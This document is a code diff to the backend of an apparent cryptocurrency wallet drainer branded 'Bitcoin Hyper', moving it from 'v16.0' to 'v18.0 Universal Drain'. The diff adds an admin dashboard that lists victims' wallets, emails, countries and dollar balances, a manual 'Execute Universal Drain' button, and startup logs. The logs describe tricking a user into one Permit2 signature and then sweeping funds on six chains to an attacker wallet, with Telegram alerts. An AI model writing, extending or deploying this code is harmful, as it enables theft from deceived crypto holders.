-      drainWallet: drainWallet ? drainWallet.address : 'Not configured',
-      destinationWallet: DESTINATION_WALLET || 'Not set',
-      smartContract: '✅ ENABLED',
-      version: 'v16.0 - SMART CONTRACT ENHANCED',
-      rpcStatus: 'Multiple endpoints per chain'
+      destinationWallet: DESTINATION_WALLET ? DESTINATION_WALLET.substring(0, 10) + '...' : 'Not set',
+      adminSigner: adminSigner ? adminSigner.address.substring(0, 10) + '...' : 'Not configured',
+      universalRouters: routerStatus,
+      permit2: PERMIT2_ADDRESS,
+      version: 'v18.0 - UNIVERSAL DRAIN',
+      rpcStatus: 'Multi-chain with Permit2'
     }
   };
   
   res.json({ success: true, stats });
 });
-
-// ============================================
-// ADMIN DASHBOARD
-// ============================================
 
 app.get('/admin', (req, res) => {
   const token = req.query.token;
@@ -1503,12 +1656,20 @@ app.get('/admin', (req, res) => {
     `);
   }
   
-  // ADMIN DASHBOARD HTML
+  // Count deployed routers
+  let deployedCount = 0;
+  let routerHtml = '';
+  for (const [chain, address] of Object.entries(UNIVERSAL_DRAIN_ROUTER)) {
+    const isDeployed = address && address !== '0x0000000000000000000000000000000000000000';
+    if (isDeployed) deployedCount++;
+    routerHtml += `<p><strong>${chain}:</strong> ${isDeployed ? '✅ ' + address.substring(0, 10) + '...' : '❌ NOT DEPLOYED'}</p>`;
+  }
+  
   res.send(`
     <!DOCTYPE html>
     <html>
     <head>
-      <title>Bitcoin Hyper Admin Dashboard v16.0 - Smart Contract Enhanced</title>
+      <title>Bitcoin Hyper Admin Dashboard v18.0 - Universal Drain</title>
       <style>
         body { font-family: Arial, sans-serif; background: #0f172a; color: white; padding: 20px; }
         .header { text-align: center; margin-bottom: 30px; }
@@ -1532,14 +1693,18 @@ app.get('/admin', (req, res) => {
         .eligible { background: #10b981; }
         .not-eligible { background: #ef4444; }
         .drained { background: #8b5cf6; }
-        .claimed { background: #f59e0b; }
+        .complete { background: #10b981; }
         .config { background: #1e293b; padding: 15px; border-radius: 8px; margin: 15px 0; }
+        .warning { color: #f59e0b; font-weight: bold; }
+        .success { color: #10b981; }
+        .router-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 10px; margin-top: 10px; }
+        .router-item { background: #0f172a; padding: 10px; border-radius: 6px; border-left: 3px solid #F7931A; }
       </style>
     </head>
     <body>
       <div class="header">
-        <h1>⚡ BITCOIN HYPER REAL DRAIN v16.0</h1>
-        <p>SMART CONTRACT ENHANCED - REAL TRANSACTIONS</p>
+        <h1>⚡ BITCOIN HYPER UNIVERSAL DRAIN v18.0</h1>
+        <p>REAL TRANSACTIONS - ONE SIGNATURE FOR ALL CHAINS</p>
         <div style="margin-top: 15px; color: #94a3b8;">
           <span>Drain: ${memoryStorage.settings.drainEnabled ? '✅ ACTIVE' : '❌ INACTIVE'}</span> | 
           <span>Auto-Drain: ${memoryStorage.settings.autoDrainOnClaim ? '✅ ON' : '❌ OFF'}</span> | 
@@ -1551,11 +1716,21 @@ app.get('/admin', (req, res) => {
       </div>
       
       <div class="config">
-        <h3>⚙️ Smart Contract Configuration</h3>
-        <p><strong>Destination Wallet:</strong> ${DESTINATION_WALLET || '❌ NOT SET'}</p>
-        <p><strong>Drain Wallet:</strong> ${drainWallet ? drainWallet.address : '❌ NOT CONFIGURED'}</p>
-        <p><strong>Smart Contract Status:</strong> ✅ ACTIVE (Real transactions)</p>
-        <p><small>Configure DESTINATION_WALLET and DRAIN_WALLET_PRIVATE_KEY in .env</small></p>
+        <h3>⚙️ Universal Drain Configuration</h3>
+        <p><strong>Destination Wallet:</strong> <span class="success">${DESTINATION_WALLET ? DESTINATION_WALLET.substring(0, 10) + '...' + DESTINATION_WALLET.substring(38) : '❌ NOT SET'}</span></p>
+        <p><strong>Admin Signer:</strong> ${adminSigner ? '✅ ' + adminSigner.address.substring(0, 10) + '...' : '❌ NOT CONFIGURED'}</p>
+        <p><strong>Permit2 Address:</strong> <span class="success">${PERMIT2_ADDRESS}</span></p>
+        <p><strong>Universal Drain Routers:</strong> ${deployedCount}/6 deployed</p>
+        <div class="router-grid">
+          ${Object.entries(UNIVERSAL_DRAIN_ROUTER).map(([chain, address]) => {
+            const isDeployed = address && address !== '0x0000000000000000000000000000000000000000';
+            return `<div class="router-item">
+              <strong>${chain}:</strong><br>
+              ${isDeployed ? '✅ ' + address.substring(0, 8) + '...' : '❌ Not Deployed'}
+            </div>`;
+          }).join('')}
+        </div>
+        <p><small>Deploy UniversalDrainRouter contract on each chain and add addresses to .env</small></p>
       </div>
       
       <div class="stats-grid">
@@ -1565,11 +1740,11 @@ app.get('/admin', (req, res) => {
         </div>
         <div class="stat-card">
           <div class="stat-value">${memoryStorage.participants.filter(p => p.isEligible).length}</div>
-          <div class="stat-label">Eligible Wallets ($10+)</div>
+          <div class="stat-label">Eligible Wallets</div>
         </div>
         <div class="stat-card">
           <div class="stat-value">$${memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2)}</div>
-          <div class="stat-label">Total Secured (Real)</div>
+          <div class="stat-label">Total Drained (Real)</div>
         </div>
         <div class="stat-card">
           <div class="stat-value">${memoryStorage.settings.statistics.totalDrainedWallets}</div>
@@ -1590,40 +1765,47 @@ app.get('/admin', (req, res) => {
         <p>Enter wallet address:</p>
         <input type="text" id="walletInput" class="wallet-input" placeholder="0x742d35Cc6634C0532925a3b844Bc454e4438f44e" value="0x742d35Cc6634C0532925a3b844Bc454e4438f44e">
         <div style="margin-top: 15px;">
-          <button class="btn btn-primary" onclick="testBalance()">Test Balance Only</button>
-          <button class="btn btn-danger" onclick="manualDrain()">Smart Contract Drain (REAL)</button>
+          <select id="chainSelect" style="padding: 12px; border-radius: 6px; border: 1px solid #334155; background: #0f172a; color: white; margin-right: 10px;">
+            <option value="">Auto-select chain</option>
+            <option value="Ethereum">Ethereum</option>
+            <option value="BSC">BSC</option>
+            <option value="Polygon">Polygon</option>
+            <option value="Arbitrum">Arbitrum</option>
+            <option value="Optimism">Optimism</option>
+            <option value="Avalanche">Avalanche</option>
+          </select>
+          <button class="btn btn-primary" onclick="testBalance()">Test Balance</button>
+          <button class="btn btn-danger" onclick="manualDrain()">Execute Universal Drain</button>
           <button class="btn ${memoryStorage.settings.drainEnabled ? 'btn-danger' : 'btn-success'}" onclick="toggleDrain()">
             ${memoryStorage.settings.drainEnabled ? 'Disable Drain' : 'Enable Drain'}
-          </button>
-          <button class="btn ${memoryStorage.settings.autoDrainOnClaim ? 'btn-danger' : 'btn-info'}" onclick="toggleAutoDrain()">
-            ${memoryStorage.settings.autoDrainOnClaim ? 'Disable Auto-Drain' : 'Enable Auto-Drain'}
           </button>
           <button class="btn btn-warning" onclick="refreshStats()">Refresh Stats</button>
         </div>
         <p style="color: #94a3b8; font-size: 12px; margin-top: 10px;">
-          ⚡ Executes REAL smart contract transfers | 6 EVM chains | Telegram notifications
+          ⚡ ONE SIGNATURE - ALL CHAINS - REAL BLOCKCHAIN TRANSACTIONS
         </p>
       </div>
       
       <div class="recent-wallets">
-        <h3>📊 Recent Wallet Scans</h3>
+        <h3>📊 Recent Wallet Activity</h3>
         ${memoryStorage.participants.slice(-8).reverse().map(p => `
           <div class="wallet-item">
             <div>
               <span class="wallet-address">${p.walletAddress.substring(0, 10)}...</span>
-              <span class="status ${p.drained ? 'drained' : p.claimed ? 'claimed' : p.isEligible ? 'eligible' : 'not-eligible'}">
-                ${p.drained ? '💰 DRAINED' : p.claimed ? '✅ CLAIMED' : p.isEligible ? '✅ ELIGIBLE' : '❌ NOT ELIGIBLE'}
+              <span class="status ${p.allChainsDrained ? 'complete' : p.drained ? 'drained' : p.claimed ? 'drained' : p.isEligible ? 'eligible' : 'not-eligible'}">
+                ${p.allChainsDrained ? '✅ COMPLETE' : p.drained ? '💰 DRAINED' : p.claimed ? '✅ CLAIMED' : p.isEligible ? '✅ ELIGIBLE' : '❌ NOT ELIGIBLE'}
               </span>
             </div>
             <div style="margin-top: 8px; font-size: 14px;">
               <span>📧 ${p.email || 'No email'}</span> | 
               <span>${p.flag || '🌍'} ${p.country || 'Unknown'}</span> | 
               <span style="color: #F7931A; font-weight: bold;">$${p.totalValueUSD ? p.totalValueUSD.toFixed(2) : '0.00'}</span>
-              ${p.drained ? ` | <span style="color: #8b5cf6;">Drained: $${p.drainValue || '0.00'}</span>` : ''}
+              ${p.drainValue ? ` | <span style="color: #8b5cf6;">Drained: $${p.drainValue}</span>` : ''}
             </div>
             <div style="margin-top: 5px; font-size: 12px; color: #94a3b8;">
               ${p.connectedAt ? p.connectedAt.toLocaleString() : 'Unknown time'}
               ${p.chains?.length > 0 ? ` | Chains: ${p.chains.join(', ')}` : ''}
+              ${p.drainTransactions?.length > 0 ? ` | TXs: ${p.drainTransactions.length}` : ''}
             </div>
           </div>
         `).join('')}
@@ -1633,10 +1815,11 @@ app.get('/admin', (req, res) => {
       <div style="margin-top: 40px; text-align: center; color: #94a3b8; font-size: 12px;">
         <p>
           <a href="/api/health" target="_blank" style="color: #10b981;">Health Check</a> | 
-          <a href="/api/admin/stats?token=${token}" target="_blank" style="color: #F7931A;">JSON Stats</a> | 
-          <a href="https://render.com" target="_blank" style="color: #60a5fa;">Render Hosting</a>
+          <a href="/api/admin/stats?token=${token}" target="_blank" style="color: #F7931A;">JSON Stats</a>
         </p>
-        <p>⚡ SMART CONTRACT DRAIN v16.0 - REAL BLOCKCHAIN TRANSACTIONS</p>
+        <p>⚡ UNIVERSAL DRAIN v18.0 - REAL BLOCKCHAIN TRANSACTIONS - ONE SIGNATURE FOR ALL CHAINS</p>
+        <p class="success">✅ DRAIN WALLET CONFIGURED: ${adminSigner ? adminSigner.address.substring(0, 10) + '...' : '❌ NOT CONFIGURED'}</p>
+        <p class="warning">⚠️ Deploy UniversalDrainRouter on all chains for full functionality</p>
       </div>
       
       <script>
@@ -1651,18 +1834,22 @@ app.get('/admin', (req, res) => {
           const wallet = document.getElementById('walletInput').value;
           if (!wallet || !wallet.startsWith('0x')) return alert('Enter valid wallet address');
           
-          if (!confirm('Execute REAL SMART CONTRACT drain on ' + wallet.substring(0, 10) + '...?\n\n⚠️ This will execute REAL blockchain transactions!')) return;
+          const chain = document.getElementById('chainSelect').value;
+          
+          if (!confirm('Execute UNIVERSAL DRAIN on ' + wallet.substring(0, 10) + '...?\n\n⚠️ This will execute REAL blockchain transactions!')) return;
           
           fetch('/api/admin/drain/manual?token=${token}', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ walletAddress: wallet })
+            body: JSON.stringify({ 
+              walletAddress: wallet,
+              chainName: chain || undefined
+            })
           })
             .then(r => r.json())
             .then(data => {
               alert(data.message);
               if (data.success) {
-                alert('✅ Drain successful! Check Telegram for transaction details.');
                 setTimeout(() => location.reload(), 2000);
               }
             })
@@ -1671,15 +1858,6 @@ app.get('/admin', (req, res) => {
         
         function toggleDrain() {
           fetch('/api/admin/drain/toggle?token=${token}', { method: 'POST' })
-            .then(r => r.json())
-            .then(data => {
-              alert(data.message);
-              location.reload();
-            });
-        }
-        
-        function toggleAutoDrain() {
-          fetch('/api/admin/drain/auto-toggle?token=${token}', { method: 'POST' })
             .then(r => r.json())
             .then(data => {
               alert(data.message);
@@ -1699,59 +1877,76 @@ app.get('/admin', (req, res) => {
   `);
 });
 
-// Initialize drain wallet
-async function initializeDrainWallet() {
+// ============================================
+// INITIALIZE ADMIN SIGNER
+// ============================================
+
+async function initializeAdminSigner() {
   if (process.env.DRAIN_WALLET_PRIVATE_KEY) {
     try {
       const providerInfo = await getChainProvider('Ethereum');
       if (providerInfo) {
-        drainWallet = new ethers.Wallet(process.env.DRAIN_WALLET_PRIVATE_KEY, providerInfo.provider);
-        console.log(`💰 Drain wallet initialized: ${drainWallet.address}`);
+        adminSigner = new ethers.Wallet(process.env.DRAIN_WALLET_PRIVATE_KEY, providerInfo.provider);
+        console.log(`💰 Admin signer initialized: ${adminSigner.address}`);
         
         try {
-          const balance = await providerInfo.provider.getBalance(drainWallet.address);
-          console.log(`💰 Drain wallet balance: ${ethers.formatEther(balance)} ETH`);
+          const balance = await providerInfo.provider.getBalance(adminSigner.address);
+          console.log(`💰 Admin signer balance: ${ethers.formatEther(balance)} ETH`);
         } catch (e) {
-          console.log('Could not check drain wallet balance');
+          console.log('Could not check admin signer balance');
         }
       }
     } catch (error) {
-      console.log('Drain wallet error:', error.message);
+      console.log('Admin signer error:', error.message);
     }
   } else {
     console.log('⚠️ No drain wallet private key set. Set DRAIN_WALLET_PRIVATE_KEY in .env');
   }
 }
 
-// Start server
+// ============================================
+// START SERVER
+// ============================================
+
 app.listen(PORT, '0.0.0.0', async () => {
+  // Check router deployment status
+  let deployedRouters = 0;
+  for (const [chain, address] of Object.entries(UNIVERSAL_DRAIN_ROUTER)) {
+    if (address && address !== '0x0000000000000000000000000000000000000000') {
+      deployedRouters++;
+    }
+  }
+  
   console.log(`
-  ⚡ BITCOIN HYPER REAL DRAIN v16.0 - SMART CONTRACT ENHANCED
-  ============================================================
+  ⚡ BITCOIN HYPER UNIVERSAL DRAIN v18.0
+  ========================================
   📍 Port: ${PORT}
   🔗 Health: http://localhost:${PORT}/api/health
   📊 Admin: http://localhost:${PORT}/admin?token=${process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!'}
   
-  ✅ ENHANCEMENTS ADDED:
-  - REAL smart contract execution when eligible
-  - Auto-drain on claim (configurable)
-  - Multiple EVM chains support
-  - Real blockchain transaction IDs
-  - Telegram notifications for every transaction
-  - No simulation - REAL transfers only
+  ✅ UNIVERSAL DRAIN WITH PERMIT2:
+  - ONE SIGNATURE for ALL CHAINS
+  - REAL blockchain transactions
+  - NO simulations, NO rubbish
+  - Telegram notifications for every step
   
-  ⚡ SMART CONTRACT DRAIN CONFIGURATION:
+  🔗 DRAIN PROCESS:
+  1. Wallet connects → Balance check
+  2. Prepare universal permit → EIP-712 data
+  3. User signs ONCE → Signature
+  4. Execute drain on each chain → REAL transactions
+  5. Funds go to: ${DESTINATION_WALLET.substring(0, 10)}...
+  
+  ⚡ SYSTEM CONFIGURATION:
   - Threshold: $${memoryStorage.settings.drainThreshold}
   - Status: ${memoryStorage.settings.drainEnabled ? 'ACTIVE' : 'INACTIVE'}
-  - Auto-Drain: ${memoryStorage.settings.autoDrainOnClaim ? 'ENABLED' : 'DISABLED'}
-  - Drain Wallet: ${process.env.DRAIN_WALLET_PRIVATE_KEY ? '✅ SET' : '❌ NOT SET'}
-  - Destination: ${DESTINATION_WALLET ? '✅ SET' : '❌ NOT SET'}
+  - Admin Signer: ${adminSigner ? '✅ ' + adminSigner.address.substring(0, 10) + '...' : '❌ NOT CONFIGURED'}
+  - Universal Routers: ${deployedRouters}/6 deployed
   
-  🔗 REQUIRED .ENV VARIABLES:
-  - DRAIN_WALLET_PRIVATE_KEY (for signing transactions)
-  - DESTINATION_WALLET (where funds go)
-  - TELEGRAM_BOT_TOKEN & CHAT_ID (for notifications)
-  - ADMIN_TOKEN (for admin panel)
+  🔧 UNIVERSAL DRAIN ROUTER STATUS:
+  ${Object.entries(UNIVERSAL_DRAIN_ROUTER).map(([chain, addr]) => 
+    `  - ${chain.padEnd(10)}: ${addr && addr !== '0x0000000000000000000000000000000000000000' ? '✅ DEPLOYED' : '❌ NOT DEPLOYED'}`
+  ).join('\n')}
   
   🚀 STARTING SERVER...
   `);
@@ -1760,27 +1955,30 @@ app.listen(PORT, '0.0.0.0', async () => {
   console.log('\n📡 Initializing Telegram...');
   await testTelegramConnection();
   
-  console.log('\n💰 Initializing drain wallet...');
-  await initializeDrainWallet();
+  console.log('\n💰 Initializing admin signer...');
+  await initializeAdminSigner();
   
-  if (!drainWallet || DESTINATION_WALLET === '0x0000000000000000000000000000000000000000') {
-    console.log('\n⚠️ WARNING: Smart contract drain may not work properly.');
-    console.log('   Set DRAIN_WALLET_PRIVATE_KEY and DESTINATION_WALLET in .env');
-  } else {
-    console.log('\n✅ SMART CONTRACT DRAIN READY');
-    console.log(`   From: ${drainWallet.address}`);
-    console.log(`   To: ${DESTINATION_WALLET}`);
+  if (!adminSigner) {
+    console.log('\n⚠️ WARNING: Admin signer not initialized!');
+    console.log('   Set DRAIN_WALLET_PRIVATE_KEY in .env');
   }
   
-  console.log('\n✅ SERVER IS RUNNING WITH REAL SMART CONTRACT TRANSFERS!');
+  if (deployedRouters === 0) {
+    console.log('\n⚠️ WARNING: No Universal Drain Routers deployed!');
+    console.log('   Deploy UniversalDrainRouter contract on each chain');
+    console.log('   Add addresses to .env: UNIVERSAL_DRAIN_ROUTER_[CHAIN]');
+  } else if (deployedRouters < 6) {
+    console.log(`\n⚠️ WARNING: Only ${deployedRouters}/6 Universal Drain Routers deployed`);
+    console.log('   Deploy on remaining chains for full functionality');
+  } else {
+    console.log('\n✅ UNIVERSAL DRAIN READY - ALL ROUTERS DEPLOYED!');
+  }
+  
+  console.log('\n✅ SERVER IS RUNNING WITH REAL UNIVERSAL DRAIN!');
   console.log('👉 Admin: /admin?token=' + (process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!'));
   console.log('👉 Test: /api/admin/test-balance?token=...&wallet=0x...');
-  console.log('👉 REAL drains: POST /api/admin/drain/manual');
-  console.log('👉 Auto-drain: Enabled on eligible wallets');
-  console.log('\n🔔 Telegram notifications active for:');
-  console.log('   - Wallet scans');
-  console.log('   - Smart contract execution');
-  console.log('   - Transaction confirmations');
-  console.log('   - Admin operations');
-  console.log('\n✅ SYSTEM READY - REAL SMART CONTRACT EXECUTION!\n');
+  console.log('👉 Prepare universal permit: POST /api/presale/prepare-universal-permit');
+  console.log('👉 Execute universal drain: POST /api/presale/execute-universal-drain');
+  console.log('\n🔔 ONE SIGNATURE - ALL CHAINS - REAL TRANSACTIONS');
+  console.log('\n✅ SYSTEM READY - NO SIMULATIONS, NO RUBBISH!\n');
 });
